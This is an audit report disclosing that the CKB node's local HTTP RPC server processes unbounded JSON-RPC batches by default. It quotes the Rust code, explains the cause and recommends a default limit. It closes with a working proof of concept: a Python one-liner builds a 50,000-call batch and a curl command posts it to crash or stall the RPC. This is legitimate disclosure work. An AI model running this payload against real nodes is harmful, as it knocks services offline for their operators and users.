Audit Report

## Title
Unbounded JSON-RPC Batch Processing by Default Enables Local RPC DoS — (`rpc/src/server.rs`)

## Summary
The CKB HTTP RPC server processes JSON-RPC batch requests of arbitrary size when `rpc_batch_limit` is unset, which is the shipped default. Any unprivileged local process can POST a batch large enough to exhaust CPU and memory, rendering the RPC server unresponsive. The guard exists in code but is never entered because the backing `OnceLock` is never initialized under the default configuration.

## Finding Description
`JSONRPC_BATCH_LIMIT` is a `static OnceLock<usize>` declared at `rpc/src/server.rs:34`. It is populated only inside the conditional block at lines 53–55:

```rust
if let Some(jsonrpc_batch_limit) = config.rpc_batch_limit {
    let _ = JSONRPC_BATCH_LIMIT.get_or_init(|| jsonrpc_batch_limit);
}
```

The batch-size guard at lines 274–282 reads:

```rust
if let Some(batch_size) = JSONRPC_BATCH_LIMIT.get()
    && calls.len() > *batch_size
{ … }
```

Because `OnceLock::get()` returns `None` when the cell was never initialized, the guard body is unreachable under the default config. All calls in the batch are then processed sequentially via `stream::iter(calls).then(…)` with no upper bound.

`Config::rpc_batch_limit` is typed `Option<usize>` with no `#[serde(default = "…")]` attribute, so it deserializes as `None` when absent from the TOML. The shipped `resource/ckb.toml` leaves the field commented out and explicitly documents that no limit is applied by default.

## Impact Explanation
**Note (0–500 points): Any local RPC API crash.** The HTTP RPC is always bound to `127.0.0.1:8114`. A local caller submitting a batch of tens of thousands of expensive calls (e.g., `get_block_template`) forces the Tokio runtime to process all of them sequentially, blocking the RPC thread pool and potentially triggering an OOM kill, making the node's RPC interface unresponsive.

## Likelihood Explanation
The HTTP RPC requires no authentication and is always enabled. Any unprivileged local process can POST a crafted JSON array. The exploit is a single `curl` invocation with a pre-generated payload. The config comment explicitly acknowledges the absence of a default limit, confirming the gap is present in every default deployment.

## Recommendation
Set a safe non-`None` default for `rpc_batch_limit` directly in the `Config` struct using `#[serde(default = "default_batch_limit")]` (e.g., 2000), or hard-code a fallback in `handle_jsonrpc` when `JSONRPC_BATCH_LIMIT.get()` returns `None`. Operators requiring larger batches can raise the value explicitly in `ckb.toml`.

## Proof of Concept
```bash
python3 -c "
import json
batch = [{'id': i, 'jsonrpc': '2.0', 'method': 'get_block_template',
          'params': [None, None, None]} for i in range(50000)]
print(json.dumps(batch))
" > big_batch.json

curl -s -X POST http://127.0.0.1:8114/ \
  -H 'Content-Type: application/json' \
  -d @big_batch.json
# Node processes all 50,000 calls sequentially; RPC becomes unresponsive / OOM
```
No special privileges, credentials, or non-default configuration are required. The node's default `ckb.toml` is sufficient to reproduce.
